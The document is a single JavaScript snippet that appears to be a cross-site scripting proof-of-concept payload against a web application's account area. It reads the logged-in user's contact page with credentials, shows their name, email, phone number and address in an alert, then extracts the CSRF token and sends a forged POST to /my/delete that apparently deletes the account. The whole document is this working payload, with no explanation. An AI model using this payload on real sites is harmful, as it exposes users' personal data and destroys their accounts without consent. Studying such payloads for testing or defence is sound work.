xhr=new XMLHttpRequest();xhr.open('GET','/my/contact');xhr.withCredentials=true;xhr.onreadystatechange=()=>{if(xhr.readyState==4){dom=new DOMParser().parseFromString(xhr.response,'text/html');alert(`Name:${dom.getElementsByName("name")[0].value}\nEmail: ${dom.getElementsByName("email")[0].value}\nPhone Number: ${dom.getElementsByName("telNo")[0].value}\nLast Name: ${dom.getElementsByName("surname")[0].value}\nAddress: ${dom.getElementsByName("street")[0].value}\nPostal Code: ${dom.getElementsByName("plz")[0].value}\nCity: ${dom.getElementsByName("ort")[0].value}`);token=dom.getElementsByName("_token")[1].value;xhr.open("POST","/my/delete");xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xhr.onreadystatechange=()=>{if(xhr.readyState==4){}};xhr.send(`_token=${token}`)}};xhr.send();
